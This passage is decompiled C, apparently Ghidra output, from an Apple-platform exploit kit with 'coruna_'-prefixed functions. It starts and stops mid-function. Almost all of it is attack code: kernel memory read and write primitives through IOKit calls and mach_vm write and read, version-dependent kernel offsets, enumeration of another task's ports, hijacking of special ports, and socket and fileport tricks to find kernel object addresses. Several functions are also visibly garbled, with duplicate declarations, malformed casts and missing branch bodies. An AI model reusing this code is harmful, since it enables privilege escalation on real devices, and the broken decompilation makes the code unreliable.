              *copy = port - type_id_15;
              copy[1] = 4;
              cache_27 = 0;
              plist = 2;
              cache_26 = 4;
              action[0] = (unsigned long)*(uint *)(arg + 0x110);
              action[1] = 0;
              cache_28 = 0;
              url_buf = 0;
              kind = _IOConnectCallMethod
                                (idx,0x33,action,2,0,0,&cache_28,&plist,&cache_27,&cache_26)
              ;
              if (kind == 0) {
                kind = 0;
                cache_22 = cache_27;
              }
              else {
                kind = kind | 0x80000000;
              }
              type_id_8 = 0xad001;
              if ((*(long *)(arg + 0xf8) != 0) &&
                 (type_id_8 = 0xad001, *(long *)(arg + 0x100) != 0)) {
                type_id_8 = 0;
                serial_11 = 0x450;
                if (*(unsigned long *)(arg + 0x158) < 0x225c192d100000) {
                  serial_11 = 0x448;
                }
                copy = (long *)(*(long *)(arg + 0x108) + *(long *)(arg + 0xf8) + serial_11);
                copy[1] = serial_12;
                *copy = base;
              }
load_ok_17:
              if (kind != 0) {
                type_id_8 = kind;
              }
              type_id_9 = (unsigned long)type_id_8;
              if (type_id_8 == 0) {
                if (3 < size) {
                  ls13 = 4;
                }
                _memcpy((void *)(n + version),(void *)((long)&cache_22 + (unsigned long)type_id_15),ls13);
              }
            }
          }
          idx = 4;
        }
        if ((int)type_id_9 != 0) goto load_ok_18;
        size = idx + (int)version;
        version = (unsigned long)size;
      } while (size < m);
    }
    type_id_9 = 0;
load_ok_18:
    if (p != 0) {
      coruna_close(cache_25);
    }
  }
  if (*(long *)k_kernel_stack_chk_guard_slot != action[2]) {
    ___stack_chk_fail();
  }
  return type_id_9;
}





unsigned long coruna_ioconnectcallmethod_1d1b4(long arg,long val,long n,uint m,int p)

{
  long off;
  unsigned long tag;
  long serial_11;
  int i;
  uint kind;
  long base;
  unsigned long type_id;
  unsigned long version;
  uint64_t type_id_8;
  uint type_id_9;
  uint type_id_10;
  uint64_t cache_27;
  uint32_t cache_29;
  unsigned long cache_23 [3];
  long scratch;
  
  scratch = *(long *)k_kernel_stack_chk_guard_slot;
  version = 0xad001;
  type_id = version;
  if (((((1 < *(int *)(arg + 0xe8) + 1U) && (*(long *)(arg + 0xf8) != 0)) &&
       (*(long *)(arg + 0x100) != 0)) && (base = coruna_kernel29bb0_residual_161(arg), base != 0)) &&
     ((cache_29 = 0xffffffff, p == 0 || (type_id = coruna_open_dev_null(&cache_29), (int)type_id == 0))))
  {
    if (m != 0) {
      type_id_9 = 0;
      do {
        kind = m - type_id_9;
        cache_27 = 0;
        base = val + (unsigned long)type_id_9;
        if (kind < 8) {
          type_id_10 = 0;
          if ((((base + (unsigned long)kind) - 1 ^ base + 7U) &
              (*(unsigned long *)(arg + 0x188) ^ 0xffffffffffffffff)) != 0) {
            type_id_10 = 8 - kind;
          }
        }
        else {
          type_id_10 = 0;
        }
        tag = 8 - (unsigned long)type_id_10;
        if ((unsigned long)kind <= 8 - (unsigned long)type_id_10) {
          tag = (unsigned long)kind;
        }
        if ((tag < 8) &&
           (type_id = coruna_ioconnectcallmethod(arg,base - (unsigned long)type_id_10,&cache_27,8,0), (int)type_id != 0))
        goto load_ok_19;
        _memcpy((void *)((long)&cache_27 + (unsigned long)type_id_10),(void *)(n + (unsigned long)type_id_9),tag);
        i = *(int *)(arg + 0xe8);
        type_id = version;
        if ((i + 1U < 2) ||
           ((*(long *)(arg + 0xf8) == 0 || (*(long *)(arg + 0x100) == 0))))
        goto load_ok_19;
        off = *(long *)(arg + 0x108) + *(long *)(arg + 0xf8);
        serial_11 = 0x368;
        if (*(int *)(arg + 0x140) < 0x2258) {
          serial_11 = 0x360;
        }
        type_id_8 = *(uint64_t *)(off + serial_11);
        *(unsigned long *)(off + serial_11) = base - (unsigned long)type_id_10;
        cache_23[0] = (unsigned long)*(uint *)(arg + 0x110);
        cache_23[1] = 0;
        cache_23[2] = cache_27;
        kind = _IOConnectCallMethod(i,0x21,cache_23,3,0,0,0,0,0,0);
        if ((*(long *)(arg + 0xf8) == 0) || (*(long *)(arg + 0x100) == 0)) {
          if (kind != 0) {
load_ok_20:
            type_id = (unsigned long)(kind | 0x80000000);
          }
          goto load_ok_19;
        }
        base = 0x368;
        if (*(int *)(arg + 0x140) < 0x2258) {
          base = 0x360;
        }
        *(uint64_t *)(*(long *)(arg + 0x108) + *(long *)(arg + 0xf8) + base) = type_id_8;
        if (kind != 0) goto load_ok_20;
        type_id_9 = (type_id_9 - type_id_10) + 8;
      } while (type_id_9 < m);
    }
    type_id = 0;
load_ok_19:
    if (p != 0) {
      coruna_close(cache_29);
    }
  }
  if (*(long *)k_kernel_stack_chk_guard_slot != scratch) {
    ___stack_chk_fail();
  }
  return type_id;
}





uint64_t coruna_mach_port_deallocate_1d418(long handle)
{
  vm_address_t address;
  
  if (1 < *(int *)(handle + 0x5c) + 1U) {
    _IOObjectRelease();
    *(uint32_t *)(handle + 0x5c) = 0;
  }
  address = *(vm_address_t *)(handle + 0x60);
  if ((address != 0) && (*(vm_size_t *)(handle + 0x68) != 0)) {
    _vm_deallocate(*(vm_map_t *)k_kernel_mach_task_self_slot,address,*(vm_size_t *)(handle + 0x68)
                  );
    *(vm_address_t *)(handle + 0x60) = 0;
    *(uint64_t *)(handle + 0x68) = 0;
  }
  *(uint64_t *)(handle + 0x70) = 0;
  *(uint64_t *)(handle + 0x78) = 0;
  if (1 < *(mach_port_name_t *)(handle + 0x58) + 1) {
    _mach_port_deallocate
              (*(ipc_space_t *)k_kernel_mach_task_self_slot,*(mach_port_name_t *)(handle + 0x58));
    *(uint32_t *)(handle + 0x58) = 0;
  }
  return 0;
}





uint64_t coruna_pthread_from_mach_thread_np_1d4a4(long handle)
{
  pthread_t p_Var1;
  vm_address_t address;
  
  if (1 < *(mach_port_t *)(handle + 0xac) + 1) {
    p_Var1 = _pthread_from_mach_thread_np(*(mach_port_t *)(handle + 0xac));
    if (1 < *(semaphore_t *)(handle + 0xd0) + 1) {
      _semaphore_signal(*(semaphore_t *)(handle + 0xd0));
      _semaphore_destroy(*(task_t *)k_kernel_mach_task_self_slot,*(semaphore_t *)(handle + 0xd0));
      *(uint32_t *)(handle + 0xd0) = 0;
    }
    if (p_Var1 != (pthread_t)0x0) {
      _pthread_join(p_Var1,(void **)0x0);
    }
    *(uint32_t *)(handle + 0xac) = 0;
  }
  address = *(vm_address_t *)(handle + 0xb0);
  if ((address != 0) && (*(vm_size_t *)(handle + 0xb8) != 0)) {
    _vm_deallocate(*(vm_map_t *)k_kernel_mach_task_self_slot,address,*(vm_size_t *)(handle + 0xb8)
                  );
    *(vm_address_t *)(handle + 0xb0) = 0;
    *(uint64_t *)(handle + 0xb8) = 0;
  }
  *(uint64_t *)(handle + 200) = 0;
  if (1 < *(mach_port_name_t *)(handle + 0x58) + 1) {
    _mach_port_deallocate
              (*(ipc_space_t *)k_kernel_mach_task_self_slot,*(mach_port_name_t *)(handle + 0x58));
    *(uint32_t *)(handle + 0x58) = 0;
  }
  return 0;
}





void coruna_kernel29bb0_residual_167(long handle,uint64_t val,uint64_t id_2)
{
  uint64_t scratch;
  
  scratch = id_2;
  coruna_kernel29bb0_via_mach_vm_machine_attribute_1e630(handle,val,&scratch,*(uint32_t *)(handle + 0x168),1);
  return;
}





uint64_t coruna_vm_deallocate_1d60c(long handle)
{
  vm_address_t address;
  uint64_t *ptr;
  uint64_t u;
  
  u = 0xad001;
  ptr = *(uint64_t **)(&k_kernel_slot_1d48 + handle);
  if (ptr != (uint64_t *)0x0) {
    address = ptr[2];
    if ((address != 0) && (ptr[3] != 0)) {
      _vm_deallocate(*(vm_map_t *)k_kernel_mach_task_self_slot,address,ptr[3]);
      ptr[2] = 0;
      ptr[3] = 0;
      ptr = *(uint64_t **)(&k_kernel_slot_1d48 + handle);
      if (ptr == (uint64_t *)0x0) {
        return 0xad001;
      }
    }
    *(uint64_t *)(&k_kernel_slot_1d48 + handle) = 0;
    *(uint8_t *)(ptr + 9) = 1;
    ___ulock_wake(0x201,(long)ptr + 0x34,*(uint32_t *)(ptr + 6));
    _pthread_join((pthread_t)ptr[5],(void **)0x0);
    ptr[1] = 0;
    *ptr = 0;
    ptr[3] = 0;
    ptr[2] = 0;
    ptr[5] = 0;
    ptr[4] = 0;
    ptr[7] = 0;
    ptr[6] = 0;
    ptr[9] = 0;
    ptr[8] = 0;
    ptr[0xb] = 0;
    ptr[10] = 0;
    ptr[0xd] = 0;
    ptr[0xc] = 0;
    ptr[0xe] = 0;
    _free(ptr);
    u = 0;
  }
  return u;
}





bool coruna_mach_vm_machine_attribute(long handle,mach_vm_address_t arg,uint32_t size)
{
  int err;
  int status;
  uint32_t scratch;
  vm_machine_attribute_val_t bootargs;
  
  scratch = size;
  if (*(void (**)(handle + 0x40) == (void (*)0x0) {
    if (((*(int *)(handle + 0xe8) + 1U < 2) || (*(long *)(handle + 0xf8) == 0)) ||
       (*(long *)(handle + 0x100) == 0)) {
      if ((*(int *)(&k_kernel_slot_1930 + handle) == -1) || (*(int *)(&k_kernel_slot_1934 + handle) == -1)) {
fail:
        status = _mach_vm_write(*(vm_map_t *)(&k_kernel_slot_1918 + handle),arg,(vm_offset_t)&scratch
                               ,4);
        bootargs = 7;
        _mach_vm_machine_attribute(*(vm_map_t *)(&k_kernel_slot_1918 + handle),arg,4,1,&bootargs);
        return status == 0;
      }
      if ((*(int *)(&k_kernel_slot_1940 + handle) == -1) || (*(long *)(handle + 0x218) == 0)) {
        if ((*(int *)(&k_kernel_slot_1938 + handle) == -1) || (*(int *)(&k_kernel_slot_193c + handle) == -1))
        status = _mach_vm_write(*(vm_map_t *)(&k_kernel_slot_1918 + handle),arg,(vm_offset_t)&scratch
        ,4);
        bootargs = 7;
        _mach_vm_machine_attribute(*(vm_map_t *)(&k_kernel_slot_1918 + handle),arg,4,1,&bootargs);
        return status == 0;
      }
      else {
        err = coruna_fcntl_1c910(handle,arg,&scratch,4,1);
      }
    }
    else {
      err = coruna_ioconnectcallmethod_1d1b4(handle,arg,&scratch,4,1);
    }
  }
  else {
    err = (**(void (**)(handle + 0x40))(handle,arg,&scratch,4,1);
  }
  status = 0;
  if (err != 0) {
    status = 5;
  }
done:
  return status == 0;
}





bool coruna_kernel29bb0_via_ioconnectcallmethod(long handle,uint64_t val,uint64_t id_2)
{
  int err;
  int status;
  uint8_t scratch[8];
  
  if (*(void (**)(handle + 0x30) == (void (*)0x0) {
    if (((*(int *)(handle + 0xe8) + 1U < 2) || (*(long *)(handle + 0xf8) == 0)) ||
       (*(long *)(handle + 0x100) == 0)) {
      if ((*(int *)(&k_kernel_slot_1930 + handle) == -1) || (*(int *)(&k_kernel_slot_1934 + handle) == -1)) {
fail:
        status = coruna_mach_vm_read_overwrite(*(uint32_t *)(&k_kernel_slot_1918 + handle),val,4,
                             *(uint32_t *)(handle + 0x178),id_2,scratch);
        return status == 0;
      }
      if ((*(int *)(&k_kernel_slot_1940 + handle) == -1) || (*(long *)(handle + 0x218) == 0)) {
        if ((*(int *)(&k_kernel_slot_1938 + handle) == -1) || (*(int *)(&k_kernel_slot_193c + handle) == -1))
        status = coruna_mach_vm_read_overwrite(*(uint32_t *)(&k_kernel_slot_1918 + handle),val,4,
        *(uint32_t *)(handle + 0x178),id_2,scratch);
        return status == 0;
      }
      else {
        err = coruna_fcntl_18eb0(handle,val,id_2,4,1);
      }
    }
    else {
      err = coruna_ioconnectcallmethod(handle,val,id_2,4,1);
    }
  }
  else {
    err = (**(void (**)(handle + 0x30))(handle,val,id_2,4,1);
  }
  status = 0;
  if (err != 0) {
    status = 5;
  }
done:
  return status == 0;
}





kern_return_t
void coruna_mach_vm_read_overwrite(vm_map_t arg,long handle,unsigned long arg_x,unsigned long arg,long addr_2,unsigned long *val)
{
  unsigned long u;
  mach_vm_size_t size;
  kern_return_t lk2;
  unsigned long size;
  unsigned long scratch;
  
  if (arg_x == 0) {
    lk2 = 4;
  }
  else {
    size = 0;
    u = arg_x;
    if (arg != 0) {
      u = arg;
    }
    do {
      size = arg_x;
      if (u <= arg_x) {
        size = u;
      }
      scratch = arg_x;
      lk2 = _mach_vm_read_overwrite(arg,size + handle,size,size + addr_2,&scratch);
      if (lk2 != 0) {
        return lk2;
      }
      size = (unsigned long)(uint)((int)scratch + (int)size);
      arg_x = arg_x - scratch;
    } while (arg_x != 0);
    lk2 = 0;
    if (val != (unsigned long *)0x0) {
      *val = size;
    }
  }
  return lk2;
}





bool coruna_kernel29bb0_via_ioconnectcallmethod_2(long handle,uint64_t val,uint64_t *id_2)
{
  int err;
  int status;
  uint8_t scratch[8];
  
  *id_2 = 0;
  if (*(void (**)(handle + 0x30) == (void (*)0x0) {
    if (((*(int *)(handle + 0xe8) + 1U < 2) || (*(long *)(handle + 0xf8) == 0)) ||
       (*(long *)(handle + 0x100) == 0)) {
      if ((*(int *)(&k_kernel_slot_1930 + handle) == -1) || (*(int *)(&k_kernel_slot_1934 + handle) == -1)) {
fail:
        status = coruna_mach_vm_read_overwrite(*(uint32_t *)(&k_kernel_slot_1918 + handle),val,
                             (long)*(int *)(handle + 0x168),*(uint32_t *)(handle + 0x178),
                             id_2,scratch);
        return status == 0;
      }
      if ((*(int *)(&k_kernel_slot_1940 + handle) == -1) || (*(long *)(handle + 0x218) == 0)) {
        if ((*(int *)(&k_kernel_slot_1938 + handle) == -1) || (*(int *)(&k_kernel_slot_193c + handle) == -1))
        status = coruna_mach_vm_read_overwrite(*(uint32_t *)(&k_kernel_slot_1918 + handle),val,
        (long)*(int *)(handle + 0x168),*(uint32_t *)(handle + 0x178),
        id_2,scratch);
        return status == 0;
      }
      else {
        err = coruna_fcntl_18eb0(handle,val,id_2,*(uint32_t *)(handle + 0x168),1);
      }
    }
    else {
      err = coruna_ioconnectcallmethod(handle,val,id_2,*(uint32_t *)(handle + 0x168),1);
    }
  }
  else {
    err = (**(void (**)(handle + 0x30))
                      (handle,val,id_2,*(uint32_t *)(handle + 0x168),1);
  }
  status = 0;
  if (err != 0) {
    status = 5;
  }
done:
  return status == 0;
}





unsigned long coruna_kernel29bb0_via_ctx_test_flag_3(long arg,unsigned long val)

{
  int j;
  
  j = coruna_ctx_test_flag(arg,0x5584001);
  if (((j != 0) && (val != 0)) && ((val >> 0x37 & 1) != 0)) {
    j = coruna_ctx_test_flag(arg,8);
    if ((j == 0) &&
       ((j = coruna_ctx_test_flag(arg,0x5000000), j == 0 ||
        (*(unsigned long *)(arg + 0x158) < 0x22580a06c00000)))) {
      val = val | 0xffffff8000000000;
    }
    else {
      val = val | 0xffff800000000000;
    }
  }
  return val;
}





bool coruna_mach_vm_machine_attribute_17a08(long handle,mach_vm_address_t arg,uint64_t val,int flags)
{
  uint u;
  int err;
  uint size;
  mach_vm_address_t *lpm4;
  long handle;
  uint64_t scratch;
  uint64_t bootargs;
  uint64_t thread_attr;
  
  scratch = val;
  if (*(void (**)(handle + 0x40) == (void (*)0x0) {
    if (((*(int *)(handle + 0xe8) + 1U < 2) || (*(long *)(handle + 0xf8) == 0)) ||
       (*(long *)(handle + 0x100) == 0)) {
      if ((*(int *)(&k_kernel_slot_1930 + handle) == -1) || (*(int *)(&k_kernel_slot_1934 + handle) == -1)) {
fail:
        err = _mach_vm_write(*(vm_map_t *)(&k_kernel_slot_1918 + handle),arg,(vm_offset_t)&scratch
                               ,*(mach_msg_type_number_t *)(handle + 0x168));
        thread_attr = coruna_u64_pack((thread_attr), (7));
        _mach_vm_machine_attribute
                  (*(vm_map_t *)(&k_kernel_slot_1918 + handle),arg,(long)*(int *)(handle + 0x168),1,
                   (vm_machine_attribute_val_t *)&thread_attr);
        return err == 0;
      }
      if ((*(int *)(&k_kernel_slot_1940 + handle) == -1) || (*(long *)(handle + 0x218) == 0)) {
        if ((*(int *)(&k_kernel_slot_1938 + handle) == -1) || (*(int *)(&k_kernel_slot_193c + handle) == -1))
        err = _mach_vm_write(*(vm_map_t *)(&k_kernel_slot_1918 + handle),arg,(vm_offset_t)&scratch
        ,*(mach_msg_type_number_t *)(handle + 0x168));
        thread_attr = coruna_u64_pack((thread_attr), (7));
        _mach_vm_machine_attribute
        (*(vm_map_t *)(&k_kernel_slot_1918 + handle),arg,(long)*(int *)(handle + 0x168),1,
        (vm_machine_attribute_val_t *)&thread_attr);
        return err == 0;
      }
      else {
        bootargs = val;
        if (flags == 0) {
          u = coruna_fcntl_1c910(handle,arg,&bootargs,*(uint32_t *)(handle + 0x168),1);
        }
        else {
          u = coruna_mach_absolute_time_1b5b4(handle,1,&k_kernel_slot_2710);
          if (u == 0) {
            if (*(unsigned long *)(handle + 0x158) < 0x1f530000000000) {
              size = coruna_open_sepmgr_1b3bc(handle,arg,val);
            }
            else {
              handle = *(long *)(handle + 0x28);
              if ((handle == 0) || (*(semaphore_t *)(handle + 8) + 1 < 2)) {
                size = 0xad001;
              }
              else {
                size = 0xad001;
                if (1 < *(int *)(handle + 0xc) + 1U) {
                  lpm4 = (mach_vm_address_t *)(handle + 0x20);
                  *lpm4 = arg;
                  *(uint64_t **)(handle + 0x28) = &thread_attr;
                  *(uint64_t *)(handle + 0x30) = 8;
                  thread_attr = val;
                  u = _semaphore_signal(*(semaphore_t *)(handle + 8));
                  if (u == 0) {
                    u = _semaphore_timedwait(*(semaphore_t *)(handle + 0xc),(mach_timespec_t)0x3)
                    ;
                    size = *(uint *)(handle + 0x3c);
                    if (size != 0) {
                      *lpm4 = 0;
                      *(uint64_t *)(handle + 0x28) = 0;
                      *(uint64_t *)(handle + 0x30) = 0;
                      coruna_semaphore_destroy(handle,0);
                      goto cleanup;
                    }
                    size = 0;
                    if (u != 0) {
                      size = u | 0x80000000;
                    }
                  }
                  else {
                    size = u | 0x80000000;
                  }
                  *lpm4 = 0;
                  *(uint64_t *)(handle + 0x28) = 0;
                  *(uint64_t *)(handle + 0x30) = 0;
                }
              }
            }
cleanup:
            u = 0xad008;
            if ((*(long *)(handle + 0x118) != 0) && (*(long *)(handle + 0x120) != 0)) {
              u = 0;
              *(uint32_t *)(*(long *)(handle + 0x118) + 1) = 0;
            }
            if (size != 0) {
              u = size;
            }
          }
        }
      }
    }
    else {
      u = coruna_ioconnectcallmethod_1d1b4(handle,arg,&scratch,*(uint32_t *)(handle + 0x168),1);
    }
  }
  else {
    u = (**(void (**)(handle + 0x40))
                      (handle,arg,&scratch,*(uint32_t *)(handle + 0x168),1);
  }
  err = 0;
  if (u != 0) {
    err = 5;
  }
done:
  return err == 0;
}





void coruna_call_mach_vm_machine_attribute_29df8_1aa8c(void)
{
  coruna_mach_vm_machine_attribute_17a08();
  return;
}





void coruna_call_mach_vm_machine_attribute_29df8_1aa94(void)
{
  coruna_kernel29bb0_via_mach_vm_machine_attribute_1e630();
  return;
}





long coruna_return_zero_20e90(long handle,unsigned long arg)
{
  long handle;
  uint scratch;
  
  if ((arg & 0xffffffff) != 0) {
    if (-1 < (int)arg) {
      handle = coruna_kernel29bb0_via_ctx_test_flag_4(handle,0,&scratch);
      if (handle == 0) {
        return 0;
      }
      return ((arg & 0xffffffff) << ((unsigned long)scratch & 0x3f)) + handle;
    }
    if ((*(long *)(handle + 0x1f0) != 0) && (*(uint *)(handle + 0x1f8) != 0)) {
      return *(long *)(handle + 0x1f0) + (arg & 0x7fffffff) * (unsigned long)*(uint *)(handle + 0x1f8)
    }
  }
  return 0;
}





bool coruna_kernel29bb0_via_ioconnectcallmethod_3(long handle,uint64_t val,uint64_t id_2,uint64_t size_3)
{
  int err;
  int status;
  
  if (*(void (**)(handle + 0x30) == (void (*)0x0) {
    if (((*(int *)(handle + 0xe8) + 1U < 2) || (*(long *)(handle + 0xf8) == 0)) ||
       (*(long *)(handle + 0x100) == 0)) {
      if ((*(int *)(&k_kernel_slot_1930 + handle) == -1) || (*(int *)(&k_kernel_slot_1934 + handle) == -1)) {
fail:
        status = coruna_mach_vm_read_overwrite(*(uint32_t *)(&k_kernel_slot_1918 + handle),val,id_2,
                             *(uint32_t *)(handle + 0x178),size_3,0);
        return status == 0;
      }
      if ((*(int *)(&k_kernel_slot_1940 + handle) == -1) || (*(long *)(handle + 0x218) == 0)) {
        if ((*(int *)(&k_kernel_slot_1938 + handle) == -1) || (*(int *)(&k_kernel_slot_193c + handle) == -1))
        status = coruna_mach_vm_read_overwrite(*(uint32_t *)(&k_kernel_slot_1918 + handle),val,id_2,
        *(uint32_t *)(handle + 0x178),size_3,0);
        return status == 0;
      }
      else {
        err = coruna_fcntl_18eb0(handle,val,size_3,id_2);
      }
    }
    else {
      err = coruna_ioconnectcallmethod(handle,val,size_3,id_2);
    }
  }
  else {
    err = (**(void (**)(handle + 0x30))(handle,val,size_3,id_2);
  }
  status = 0;
  if (err != 0) {
    status = 5;
  }
done:
  return status == 0;
}





bool coruna_kernel29bb0_via_mach_vm_machine_attribute_1e630(long handle)
{
  int err;
  int status;
  
  if (*(void (**)(handle + 0x40) == (void (*)0x0) {
    if (((*(int *)(handle + 0xe8) + 1U < 2) || (*(long *)(handle + 0xf8) == 0)) ||
       (*(long *)(handle + 0x100) == 0)) {
      if ((*(int *)(&k_kernel_slot_1930 + handle) == -1) || (*(int *)(&k_kernel_slot_1934 + handle) == -1)) {
fail:
        status = coruna_mach_vm_machine_attribute_1e630(*(uint32_t *)(&k_kernel_slot_1918 + handle));
        return status == 0;
      }
      if ((*(int *)(&k_kernel_slot_1940 + handle) == -1) || (*(long *)(handle + 0x218) == 0)) {
        if ((*(int *)(&k_kernel_slot_1938 + handle) == -1) || (*(int *)(&k_kernel_slot_193c + handle) == -1))
        status = coruna_mach_vm_machine_attribute_1e630(*(uint32_t *)(&k_kernel_slot_1918 + handle));
        return status == 0;
      }
      else {
        err = coruna_fcntl_1c910();
      }
    }
    else {
      err = coruna_ioconnectcallmethod_1d1b4();
    }
  }
  else {
    err = (**(void (**)(handle + 0x40))();
  }
  status = 0;
  if (err != 0) {
    status = 5;
  }
done:
  return status == 0;
}





void coruna_call_mach_vm_machine_attribute_29df8_1accc(void)
{
  coruna_mach_vm_machine_attribute_17a08();
  return;
}





void coruna_call_mach_vm_machine_attribute_29df8_1acd4(void)
{
  coruna_kernel29bb0_via_mach_vm_machine_attribute_1e630();
  return;
}





kern_return_t
void coruna_mach_vm_machine_attribute_1e630(vm_map_t arg,mach_vm_address_t arg_x,long handle,uint size,uint flags_2)
{
  uint u;
  uint dataCnt;
  kern_return_t lk2;
  long handle;
  uint size;
  vm_machine_attribute_val_t scratch;
  
  u = size;
  if (flags_2 != 0) {
    u = flags_2;
  }
  if (size != 0) {
    handle = 0;
    size = size;
    do {
      dataCnt = size;
      if (u <= size) {
        dataCnt = u;
      }
      lk2 = _mach_vm_write(arg,handle + arg_x,handle + handle,dataCnt);
      if (lk2 != 0) {
        return lk2;
      }
      handle = handle + (unsigned long)dataCnt;
      size = size - dataCnt;
    } while (size != 0);
  }
  scratch = 7;
  _mach_vm_machine_attribute(arg,arg_x,(unsigned long)size,1,&scratch);
  return 0;
}





unsigned long coruna_port_space_info(long arg)

{
  mach_port_name_t name;
  uint8_t *ptr;
  uint8_t *copy;
  int status;
  uint size;
  kern_return_t lk5;
  uint type_id_16;
  unsigned long type_id;
  long serial;
  unsigned long type_id_8;
  mach_msg_type_number_t cache_30;
  integer_t cache [3];
  int cache_31;
  uint64_t thread_attr;
  uint64_t region;
  uint64_t cache_22;
  uint64_t host_info;
  uint64_t serial_buf;
  uint64_t action;
  uint32_t cache_23;
  mach_msg_type_number_t cache_32;
  ipc_info_tree_name_array_t action;
  mach_msg_type_number_t cache_33;
  ipc_info_name_array_t scratch;
  ipc_info_space_t stack_guard;
  ipc_space_t sa_new;
  
  if (arg == 0) {
    type_id = 0xad001;
  }
  else if (*(int *)k_kernel_bootstrap_port_slot + 1U < 2) {
    type_id = 0x28003;
    sa_new = 0;
    status = coruna_call_macho_data_seg_2bb24_2bdb4_24f38(arg,1,&sa_new);
    if (status != 0) {
      stack_guard.iis_genno_mask = 0;
      stack_guard.iis_table_size = 0;
      stack_guard.iis_table_next = 0;
      stack_guard.iis_tree_size = 0;
      stack_guard.iis_tree_small = 0;
      stack_guard.iis_tree_hash = 0;
      scratch = (ipc_info_name_array_t)0x0;
      cache_33 = 0;
      action = (ipc_info_tree_name_array_t)0x0;
      cache_32 = 0;
      size = _mach_port_space_info(sa_new,&stack_guard,&scratch,&cache_33,&action,&cache_32);
      copy = k_kernel_mach_task_self_slot;
      if (size == 0) {
        if (cache_33 != 0) {
          serial = 0;
          type_id_8 = 0;
          do {
            cache_23 = 0;
            host_info = 0;
            cache_22 = 0;
            action = 0;
            serial_buf = 0;
            ghidra_stack_0 = 0;
            cache[0] = 0;
            cache[1] = 0;
            region = 0;
            thread_attr = 0;
            cache_30 = 0x11;
            if (((((*(byte *)((long)&scratch->iin_type + serial + 2) & 0x1f) != 0) &&
                 (name = *(mach_port_name_t *)((long)&scratch->iin_name + serial), 1 < name + 1)) &&
                (lk5 = _mach_port_get_attributes(sa_new,name,7,cache,&cache_30), lk5 == 0))
               && ((cache_31 == 0x80 && ((~cache_22 & 6) == 0)))) {
              if ((1 < *(int *)((long)&scratch->iin_name + serial) + 1U) &&
                 ((serial = coruna_kernel29bb0_via_kernel29bb0_trampoline_0001a670_7(arg,sa_new), ptr = k_kernel_bootstrap_port_slot,
                  serial != 0 &&
                  (type_id = coruna_mach_port_deallocate_22af8(arg,serial,k_kernel_bootstrap_port_slot), (int)type_id == 0
                  )))) {
                type_id_16 = _task_set_special_port(*(task_t *)copy,4,*(mach_port_t *)ptr);
                size = 0;
                if (type_id_16 != 0) {
                  size = type_id_16 | 0x80000000;
                }
                type_id = (unsigned long)size;
              }
              break;
            }
            type_id_8 = type_id_8 + 1;
            serial = serial + 0x1c;
          } while (type_id_8 < cache_33);
        }
      }
      else {
        type_id = (unsigned long)(size | 0x80000000);
      }
      if ((scratch != (ipc_info_name_array_t)0x0) && (cache_33 != 0)) {
        _mach_vm_deallocate(*(vm_map_t *)copy,(mach_vm_address_t)scratch,(unsigned long)cache_33 * 0x1c);
      }
      if ((action != (ipc_info_tree_name_array_t)0x0) && (cache_32 != 0)) {
        _mach_vm_deallocate(*(vm_map_t *)copy,(mach_vm_address_t)action,(unsigned long)cache_32 * 0x24);
      }
      _mach_port_deallocate(*(ipc_space_t *)copy,sa_new);
    }
  }
  else {
    type_id = 0;
  }
  return type_id;
}





int coruna_semaphore_timedwait(long handle,uint size)
{
  kern_return_t lk1;
  
  lk1 = _semaphore_timedwait
                    (*(semaphore_t *)(handle + 0x264),
                     (mach_timespec_t)
                     ((unsigned long)size / 1000000 | (unsigned long)((size % 1000000) * 1000 >> 3) << 0x23));
  return -(uint)(lk1 != 0x31);
}





void coruna_thread_depress_abort(uint64_t *val)
{
  thread_act_t thread;
  bool err;
  kern_return_t lk2;
  uint64_t u;
  short ls4;
  unsigned long size;
  double ld6;
  double ld7;
  mach_timebase_info_t scratch;
  mach_msg_type_number_t bootargs;
  integer_t thread_attr [6];
  int host_info;
  
  thread = *(thread_act_t *)(val + 1);
  _mach_timebase_info(&scratch);
  if (*(int *)*val == 0) {
    err = false;
    ls4 = 0;
    size = 0;
    ld7 = (double)NEON_ucvtf((unsigned long)scratch.denom);
    ld6 = (double)NEON_ucvtf((unsigned long)scratch.numer);
    ld6 = (ld7 / ld6) * k_kernel_rodata_word_2aee0;
    do {
      if ((thread != 0) && (ls4 == 0)) {
        if (*(char *)((long)val + 0xc) != '\0') {
          _thread_depress_abort(thread);
        }
        bootargs = 10;
        lk2 = _thread_info(thread,3,thread_attr,&bootargs);
        if (lk2 == 0) {
          if (host_info == 3) {
            u = _mach_absolute_time();
            if (size == 0) {
              size = (unsigned long)(ld6 * 50.0 + (double)u);
            }
            else if (size < u) {
              _thread_switch(thread,1,1);
              size = 0;
            }
          }
          else {
            size = 0;
          }
          if (host_info == 4) {
            if (!err) {
              err = true;
              goto fail;
            }
            _thread_switch(thread,1,1);
          }
          err = false;
        }
      }
fail:
      ls4 = ls4 + 1;
    } while (*(int *)*val == 0);
  }
  _free(val);
  _pthread_exit((void *)0x0);
}





uint64_t coruna_connect_setsockopt(long handle)
{
  int err;
  int status;
  uint u;
  int *err;
  uint *ptr;
  long handle;
  long addr;
  sockaddr scratch;
  uint64_t scratch;
  uint64_t bootargs;
  long bootargs;
  mach_port_name_t thread_attr;
  
  addr = *(long *)(handle + 0x28);
  if (addr == 0) {
    return 0;
  }
  thread_attr = 0;
  err = _socket(0x20,2,2);
  if (-1 < err) {
    scratch.sa_data[6] = '\0';
    scratch.sa_data[7] = '\0';
    scratch.sa_data[8] = '\0';
    scratch.sa_data[9] = '\0';
    scratch.sa_data[10] = '\0';
    scratch.sa_data[0xb] = '\0';
    scratch.sa_data[0xc] = '\0';
    scratch.sa_data[0xd] = '\0';
    bootargs = 0;
    scratch = 0;
    scratch.sa_len = '\0';
    scratch.sa_family = '\0';
    scratch.sa_data[0] = '\0';
    scratch.sa_data[1] = '\0';
    scratch.sa_data[2] = '\x02';
    scratch.sa_data[3] = '\0';
    scratch.sa_data[4] = '\0';
    scratch.sa_data[5] = '\0';
    status = _connect(err,&scratch,0x20);
    if ((status == 0) && (status = _fileport_makeport(err,&thread_attr), status == 0)) {
      u = coruna_kernel29bb0_via_kernel29bb0_via_return_zero_1f078_4(handle,thread_attr,&bootargs);
      if (u == 0) {
        status = coruna_kernel29bb0_via_ioconnectcallmethod_2(handle,bootargs + 0x10,&bootargs);
        u = 0x2800f;
        if (status != 0) {
          handle = coruna_ptr_canonicalize(handle,bootargs);
          if (handle != 0) {
            status = coruna_kernel29bb0_via_ioconnectcallmethod_2(handle,bootargs + 0x30,&bootargs);
            u = 0x2800f;
            if (status == 0) {
              if (1 < thread_attr + 1) {
                _mach_port_deallocate(*(ipc_space_t *)k_kernel_mach_task_self_slot,thread_attr);
              }
